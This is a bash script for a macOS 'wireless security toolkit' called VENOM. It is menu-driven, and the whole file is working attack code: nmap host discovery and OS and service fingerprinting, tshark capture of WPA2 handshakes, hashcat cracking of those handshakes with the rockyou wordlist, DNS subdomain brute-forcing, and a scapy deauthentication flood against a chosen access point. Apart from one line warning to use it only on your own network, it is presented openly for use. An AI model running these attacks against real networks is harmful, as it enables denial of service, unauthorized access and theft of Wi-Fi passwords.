#!/bin/bash
# Title: VENOM - Wireless Security Toolkit (macOS Edition)
# Version: 3.0-mac

CONFIG_FILE="$HOME/.venom_mac.conf"
CAPTURE_DIR="$HOME/venom_captures"
MONITOR_IFACE=""

[ -f "$CONFIG_FILE" ] && source "$CONFIG_FILE"

# ============================================
# THEME
# ============================================
C_BR_GREEN='\033[1;32m'
C_GREEN='\033[0;32m'
C_GRAY='\033[0;37m'
C_WARN='\033[1;31m'
C_YELLOW='\033[1;33m'
C_NC='\033[0m'

# ============================================
# UTILITY
# ============================================
log() {
    local color_name; color_name=$(printf '%s' "$1" | tr '[:lower:]' '[:upper:]')
    local msg=$2; [ -z "$msg" ] && msg=$1
    local color_code
    case $color_name in
        GREEN)    color_code=$C_GREEN ;;
        BR_GREEN) color_code=$C_BR_GREEN ;;
        GRAY)     color_code=$C_GRAY ;;
        WARN)     color_code=$C_WARN ;;
        YELLOW)   color_code=$C_YELLOW ;;
        *) printf "%s\n" "$msg"; return ;;
    esac
    printf "%b%s%b\n" "$color_code" "$msg" "$C_NC"
}

press_enter() {
    printf "%b\nPress [Enter] to continue...%b" "$C_GREEN" "$C_NC"
    read -r
}

save_config() {
    printf 'MONITOR_IFACE="%s"\n' "$MONITOR_IFACE" > "$CONFIG_FILE"
}

monitor_status() {
    if [ -n "$MONITOR_IFACE" ]; then
        printf "%b[MONITOR: %s]%b" "$C_BR_GREEN" "$MONITOR_IFACE" "$C_NC"
    else
        printf "%b[NO MONITOR ADAPTER]%b" "$C_WARN" "$C_NC"
    fi
}

require_monitor() {
    if [ -z "$MONITOR_IFACE" ]; then
        log warn "This feature requires a monitor mode adapter."
        log gray "Go to Settings (9) to configure one."
        press_enter
        return 1
    fi
    return 0
}

# ============================================
# SCANNING
# ============================================
scan_networks_mac() {
    clear
    log br_green "Scanning for Wireless Networks..."
    log gray "This may take a moment."

    local scan_output
    scan_output=$(system_profiler SPAirPortDataType 2>/dev/null)

    if [ -z "$scan_output" ]; then
        log warn "Scan returned no results. Is Wi-Fi enabled?"
        press_enter
        return
    fi

    log gray "------------------------------------------------------------------------"
    printf "%b %-28s %-18s %-20s %s%b\n" "$C_BR_GREEN" "SSID" "CHANNEL" "SECURITY" "SIGNAL" "$C_NC"
    log gray "------------------------------------------------------------------------"

    local tmpfile parsed
    tmpfile=$(mktemp)
    printf '%s' "$scan_output" > "$tmpfile"

    parsed=$(python3 - "$tmpfile" << 'PYEOF'
import sys

with open(sys.argv[1]) as f:
    lines = f.read().splitlines()

in_networks = False
current_section = None
current_ssid = None
props = {}
networks = []

for line in lines:
    stripped = line.strip()
    if not stripped:
        continue
    indent = len(line) - len(line.lstrip())

    if indent == 10 and stripped.endswith(':'):
        if current_ssid:
            networks.append((current_ssid, dict(props), current_section))
            current_ssid = None
            props = {}
        if 'Current Network Information' in stripped:
            in_networks = True
            current_section = 'current'
        elif 'Other Local Wi-Fi Networks' in stripped:
            in_networks = True
            current_section = 'other'
        else:
            in_networks = False
            current_section = None
        continue

    if not in_networks:
        continue

    if indent == 12 and stripped.endswith(':'):
        if current_ssid:
            networks.append((current_ssid, dict(props), current_section))
        current_ssid = stripped[:-1]
        props = {}
        continue

    if indent >= 14 and current_ssid and ': ' in stripped:
        key, _, val = stripped.partition(': ')
        if key not in props:
            props[key] = val

if current_ssid:
    networks.append((current_ssid, dict(props), current_section))

seen = {}
for ssid, p, sec in networks:
    if ssid not in seen:
        seen[ssid] = (p, sec)
    elif 'Signal / Noise' in p and 'Signal / Noise' not in seen[ssid][0]:
        seen[ssid] = (p, sec)

for ssid, (p, sec) in seen.items():
    channel  = p.get('Channel', 'N/A')
    security = p.get('Security', 'N/A')
    signal   = p.get('Signal / Noise', 'N/A')
    marker   = '*' if sec == 'current' else ' '
    print(f"{marker}|{ssid}|{channel}|{security}|{signal}")
PYEOF
)
    rm -f "$tmpfile"

    while IFS='|' read -r marker ssid channel security signal; do
        if [ "$marker" = "*" ]; then
            printf "%b* %-28s %-18s %-20s %s%b\n" "$C_BR_GREEN" "$ssid" "$channel" "$security" "$signal" "$C_NC"
        else
            printf "%b  %-28s %-18s %-20s %s%b\n" "$C_GRAY" "$ssid" "$channel" "$security" "$signal" "$C_NC"
        fi
    done <<< "$parsed"

    log gray "------------------------------------------------------------------------"
    log gray "  * = currently connected"
    press_enter
}

nmap_host_discovery() {
    clear
    log br_green "Network Host Discovery"
    log gray "Detecting local subnet on en0..."

    local my_ip subnet
    my_ip=$(ipconfig getifaddr en0 2>/dev/null)

    if [ -z "$my_ip" ]; then
        log warn "Could not get IP on en0. Is Wi-Fi connected?"
        press_enter
        return
    fi

    subnet=$(printf '%s' "$my_ip" | awk -F. '{print $1"."$2"."$3".0/24"}')
    log gray "Your IP : $my_ip"
    log gray "Subnet  : $subnet"
    log gray "------------------------------------------------------------------------"

    nmap -sn "$subnet" 2>/dev/null | while IFS= read -r line; do
        case "$line" in
            *"Nmap scan report"*) printf "%b%s%b\n" "$C_BR_GREEN" "$line" "$C_NC" ;;
            *"MAC Address"*)      printf "%b  %s%b\n" "$C_YELLOW" "$line" "$C_NC" ;;
            *"Host is up"*)       printf "%b  %s%b\n" "$C_GREEN" "$line" "$C_NC" ;;
            *"Nmap done"*)        printf "%b%s%b\n" "$C_GRAY" "$line" "$C_NC" ;;
        esac
    done

    log gray "------------------------------------------------------------------------"
    press_enter
}

service_fingerprint() {
    clear
    log br_green "Service & Version Fingerprint"
    printf "%b\nEnter target IP or hostname: %b" "$C_GREEN" "$C_NC"
    read -r target

    if [ -z "$target" ]; then
        log warn "No target specified."
        press_enter
        return
    fi

    log gray "Scanning $target — this may take a while..."
    log gray "------------------------------------------------------------------------"

    sudo nmap -sV -sC -O --open "$target" 2>/dev/null | while IFS= read -r line; do
        case "$line" in
            *"open"*)                      printf "%b%s%b\n" "$C_BR_GREEN" "$line" "$C_NC" ;;
            *"filtered"*)                  printf "%b%s%b\n" "$C_WARN"     "$line" "$C_NC" ;;
            *"OS:"*|*"Running:"*|*"OS details"*) printf "%b%s%b\n" "$C_YELLOW"   "$line" "$C_NC" ;;
            *)                             printf "%b%s%b\n" "$C_GRAY"     "$line" "$C_NC" ;;
        esac
    done

    log gray "------------------------------------------------------------------------"
    press_enter
}

# ============================================
# ATTACKS
# ============================================
capture_handshake() {
    clear
    log br_green "Capture WPA2 Handshake"

    local iface="${MONITOR_IFACE:-en0}"

    if [ -z "$MONITOR_IFACE" ]; then
        log yellow "No monitor adapter set — using $iface."
        log gray "Passive mode: only captures handshakes from YOUR own reconnects."
        log gray "Set a monitor adapter in Settings (9) to capture all clients."
    else
        log green "Monitor adapter: $MONITOR_IFACE"
        log gray "Will capture EAPOL frames from all visible clients."
    fi

    mkdir -p "$CAPTURE_DIR"
    local capfile="$CAPTURE_DIR/handshake_$(date +%Y%m%d_%H%M%S).pcap"

    log gray "Output  : $capfile"
    log gray "Filter  : EAPOL (0x888e) — WPA2 4-way handshake frames"
    log warn "Press Ctrl+C to stop capture."
    log gray "------------------------------------------------------------------------"

    sudo tshark -i "$iface" -w "$capfile" -f "ether proto 0x888e" 2>/dev/null

    log gray "------------------------------------------------------------------------"
    if [ -f "$capfile" ] && [ -s "$capfile" ]; then
        log green "Saved: $capfile"
    else
        log warn "Capture file is empty — no handshakes were seen."
        log gray "Tip: Force a device to reconnect to capture its handshake."
    fi
    press_enter
}

crack_handshake() {
    clear
    log br_green "Crack WPA2 Handshake (Hashcat)"

    if ! command -v hcxpcapngtool > /dev/null 2>&1; then
        log warn "hcxtools is not installed."
        log gray "Install it with: brew install hcxtools"
        log gray "It converts .pcap files to hashcat's hc22000 format."
        press_enter
        return
    fi

    mkdir -p "$CAPTURE_DIR"

    local capfiles=()
    while IFS= read -r f; do
        capfiles+=("$f")
    done <<< "$(find "$CAPTURE_DIR" -name "*.pcap" 2>/dev/null | sort)"

    if [ ${#capfiles[@]} -eq 0 ] || [ -z "${capfiles[0]}" ]; then
        log warn "No .pcap files found in $CAPTURE_DIR"
        log gray "Run 'Capture WPA2 Handshake' first."
        press_enter
        return
    fi

    log gray "Available captures:"
    log gray "------------------------------------------------------------------------"
    local i=1
    for f in "${capfiles[@]}"; do
        printf "%b  %d) %s%b\n" "$C_GREEN" "$i" "$(basename "$f")" "$C_NC"
        i=$((i+1))
    done
    log gray "------------------------------------------------------------------------"
    printf "%b\nSelect file [1-%d]: %b" "$C_GREEN" "${#capfiles[@]}" "$C_NC"
    read -r sel

    if ! printf '%s' "$sel" | grep -qE '^[0-9]+$' || \
       [ "$sel" -lt 1 ] || [ "$sel" -gt "${#capfiles[@]}" ]; then
        log warn "Invalid selection."
        press_enter
        return
    fi

    local capfile="${capfiles[$((sel-1))]}"
    local hcfile="${capfile%.pcap}.hc22000"

    log gray "Converting to hashcat format..."
    hcxpcapngtool -o "$hcfile" "$capfile" 2>/dev/null

    if [ ! -s "$hcfile" ]; then
        log warn "No valid WPA handshakes found in capture."
        log gray "Tip: Ensure a full 4-way handshake was captured (client must reconnect)."
        press_enter
        return
    fi

    log green "Converted: $(basename "$hcfile")"

    local default_wl="/usr/share/wordlists/rockyou.txt"
    printf "%b\nWordlist path [%s]: %b" "$C_GREEN" "$default_wl" "$C_NC"
    read -r wordlist
    wordlist="${wordlist:-$default_wl}"

    if [ ! -f "$wordlist" ]; then
        log warn "Wordlist not found: $wordlist"
        log gray "Download rockyou.txt or specify another path."
        press_enter
        return
    fi

    log gray "------------------------------------------------------------------------"
    log br_green "Starting hashcat — mode 22000 (WPA-PBKDF2-PMKID+EAPOL)"
    log warn "Press q inside hashcat to quit."
    log gray "------------------------------------------------------------------------"

    hashcat -m 22000 "$hcfile" "$wordlist" --force
    press_enter
}

dns_recon() {
    clear
    log br_green "DNS Recon"
    printf "%b\nEnter target domain (e.g. example.com): %b" "$C_GREEN" "$C_NC"
    read -r domain

    if [ -z "$domain" ]; then
        log warn "No domain specified."
        press_enter
        return
    fi

    log gray "------------------------------------------------------------------------"

    local sections="A AAAA MX NS TXT SOA"
    for rtype in $sections; do
        local result
        result=$(dig +short "$rtype" "$domain" 2>/dev/null)
        if [ -n "$result" ]; then
            printf "%b[ %s ]%b\n" "$C_BR_GREEN" "$rtype" "$C_NC"
            while IFS= read -r rec; do
                printf "%b  %s%b\n" "$C_GREEN" "$rec" "$C_NC"
            done <<< "$result"
        fi
    done

    log br_green "[ DNS Brute-Force (nmap) ]"
    log gray "Probing common subdomains..."
    nmap --script dns-brute "$domain" 2>/dev/null | while IFS= read -r line; do
        case "$line" in
            *"Starting Nmap"*|*"Nmap done"*|"#"*) ;;
            *) printf "%b%s%b\n" "$C_GRAY" "$line" "$C_NC" ;;
        esac
    done

    log gray "------------------------------------------------------------------------"
    press_enter
}

# ============================================
# MONITOR MODE ATTACKS
# ============================================
deauth_attack() {
    require_monitor || return
    clear
    log br_green "Deauth Attack"
    log warn "WARNING: Only use against your own network/lab!"
    log gray "------------------------------------------------------------------------"

    if ! python3 -c "from scapy.all import sendp" 2>/dev/null; then
        log warn "Scapy is not installed."
        log gray "Install with: pip3 install scapy"
        press_enter
        return
    fi

    printf "%b\nTarget AP BSSID (e.g. AA:BB:CC:DD:EE:FF): %b" "$C_GREEN" "$C_NC"
    read -r ap_bssid

    if [ -z "$ap_bssid" ]; then
        log warn "No BSSID entered."
        press_enter
        return
    fi

    printf "%bClient MAC [FF:FF:FF:FF:FF:FF for broadcast deauth]: %b" "$C_GREEN" "$C_NC"
    read -r client_mac
    client_mac="${client_mac:-FF:FF:FF:FF:FF:FF}"

    printf "%bPacket count [100]: %b" "$C_GREEN" "$C_NC"
    read -r pkt_count
    pkt_count="${pkt_count:-100}"

    log gray "------------------------------------------------------------------------"
    log br_green "Sending $pkt_count deauth frames on $MONITOR_IFACE..."
    log warn "Press Ctrl+C to stop early."
    log gray "------------------------------------------------------------------------"

    sudo python3 - "$MONITOR_IFACE" "$ap_bssid" "$client_mac" "$pkt_count" << 'PYEOF'
import sys
from scapy.all import sendp, conf
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

iface  = sys.argv[1]
ap     = sys.argv[2]
client = sys.argv[3]
count  = int(sys.argv[4])
conf.verb = 0

pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth(reason=7)
print(f"[*] Interface : {iface}")
print(f"[*] AP        : {ap}")
print(f"[*] Target    : {client}")
print(f"[*] Sending {count} frames...")
sendp(pkt, iface=iface, count=count, inter=0.1)
print("[+] Done.")
PYEOF
    press_enter
}

monitor_capture() {
    require_monitor || return
    clear
    log br_green "Promiscuous Capture (Monitor Mode)"
    log gray "Interface: $MONITOR_IFACE"

    mkdir -p "$CAPTURE_DIR"
    local capfile="$CAPTURE_DIR/monitor_$(date +%Y%m%d_%H%M%S).pcap"

    printf "%b\nOptional BPF capture filter (blank = capture all 802.11): %b" "$C_GREEN" "$C_NC"
    read -r bpf_filter

    log gray "Output  : $capfile"
    log warn "Press Ctrl+C to stop."
    log gray "------------------------------------------------------------------------"

    if [ -n "$bpf_filter" ]; then
        sudo tshark -i "$MONITOR_IFACE" -w "$capfile" -f "$bpf_filter" 2>/dev/null
    else
        sudo tshark -i "$MONITOR_IFACE" -w "$capfile" 2>/dev/null
    fi

    log gray "------------------------------------------------------------------------"
    log green "Saved: $capfile"
    press_enter
}

# ============================================
# SETTINGS
# ============================================
monitor_adapter_settings() {
    while true; do
        clear
        log br_green "Monitor Mode Adapter Settings"
        log gray "------------------------------------------------------------------------"
        printf "%bCurrent adapter: %b" "$C_GRAY" "$C_NC"
        if [ -n "$MONITOR_IFACE" ]; then
            printf "%b%s%b\n" "$C_BR_GREEN" "$MONITOR_IFACE" "$C_NC"
        else
            printf "%bNOT SET%b\n" "$C_WARN" "$C_NC"
        fi

        log gray ""
        log gray "Available interfaces:"
        ifconfig -l 2>/dev/null | tr ' ' '\n' | while read -r iface; do
            printf "%b  %s%b\n" "$C_GREEN" "$iface" "$C_NC"
        done

        log gray "------------------------------------------------------------------------"
        log green "1) Set monitor adapter interface"
        log green "2) Enable monitor mode on adapter"
        log green "3) Disable monitor mode / restore managed mode"
        log green "4) Clear adapter setting"
        log green "b) Back to main menu"
        printf "%b\nChoice: %b" "$C_GREEN" "$C_NC"
        read -r sc

        case "$sc" in
            1)
                printf "%bInterface name (e.g. en5, wlan0mon): %b" "$C_GREEN" "$C_NC"
                read -r new_iface
                if [ -n "$new_iface" ]; then
                    MONITOR_IFACE="$new_iface"
                    save_config
                    log green "Monitor adapter set to: $MONITOR_IFACE"
                else
                    log warn "No interface entered. Unchanged."
                fi
                press_enter ;;
            2)
                if [ -z "$MONITOR_IFACE" ]; then
                    log warn "No adapter configured. Use option 1 first."
                else
                    log gray "Enabling monitor mode on $MONITOR_IFACE..."
                    if sudo ifconfig "$MONITOR_IFACE" monitor 2>/dev/null; then
                        log green "Monitor mode enabled on $MONITOR_IFACE."
                    else
                        log warn "Could not enable monitor mode automatically."
                        log gray "Try manually: sudo ifconfig $MONITOR_IFACE monitor"
                        log gray "Some adapters require a vendor driver (e.g. Alfa AWUS036ACS)."
                    fi
                fi
                press_enter ;;
            3)
                if [ -z "$MONITOR_IFACE" ]; then
                    log warn "No adapter configured."
                else
                    log gray "Restoring managed mode on $MONITOR_IFACE..."
                    if sudo ifconfig "$MONITOR_IFACE" -monitor 2>/dev/null; then
                        log green "Managed mode restored on $MONITOR_IFACE."
                    else
                        log warn "Could not disable monitor mode."
                        log gray "Try manually: sudo ifconfig $MONITOR_IFACE -monitor"
                    fi
                fi
                press_enter ;;
            4)
                MONITOR_IFACE=""
                save_config
                log warn "Monitor adapter cleared."
                press_enter ;;
            b|B) break ;;
            *) log warn "Invalid choice." && sleep 1 ;;
        esac
    done
}

# ============================================
# MAIN MENU
# ============================================
main_menu() {
    while true; do
        clear
        printf "%b" "$C_BR_GREEN"
        echo " __   _____ _  _  ___  __  __"
        echo " \\ \ / / __| \\| |/ _ \\|  \\/  |"
        echo "  \ V /| _|| .\` | (_) | |\\/| |"
        echo "   \_/ |___|_|\\_|\___/|_|  |_|"
        printf "%b" "$C_GRAY"
        echo "       Wireless Toolkit v3.0 (macOS Edition)"
        printf "\n"
        printf "%b Monitor: %b" "$C_GRAY" "$C_NC"
        monitor_status
        printf "\n"

        log gray "========================================"
        log br_green " SCANNING"
        log gray "========================================"
        log green " 1) Scan Wireless Networks"
        log green " 2) Network Host Discovery       (nmap)"
        log green " 3) Service & Version Fingerprint (nmap)"
        log gray "========================================"
        log br_green " ATTACKS"
        log gray "========================================"
        log green " 4) Capture WPA2 Handshake      (tshark)"
        log green " 5) Crack WPA2 Handshake        (hashcat)"
        log green " 6) DNS Recon                    (dig/nmap)"

        if [ -n "$MONITOR_IFACE" ]; then
            log green " 7) Deauth Attack               [MONITOR]"
            log green " 8) Promiscuous Capture         [MONITOR]"
        else
            log gray " 7) Deauth Attack               [monitor adapter required]"
            log gray " 8) Promiscuous Capture         [monitor adapter required]"
        fi

        log gray "========================================"
        log br_green " SETTINGS"
        log gray "========================================"
        printf "%b 9) Monitor Mode Adapter         %b" "$C_GREEN" "$C_NC"
        monitor_status
        printf "\n"
        log gray "========================================"
        log green " q) Quit"

        printf "%b\nEnter choice: %b" "$C_GREEN" "$C_NC"
        read -r choice

        case "$choice" in
            1) scan_networks_mac ;;
            2) nmap_host_discovery ;;
            3) service_fingerprint ;;
            4) capture_handshake ;;
            5) crack_handshake ;;
            6) dns_recon ;;
            7) deauth_attack ;;
            8) monitor_capture ;;
            9) monitor_adapter_settings ;;
            q|Q) break ;;
            *) log warn "Invalid choice." && sleep 1 ;;
        esac
    done
    log br_green "Exiting VENOM. Goodbye."
}

main_menu
exit 0
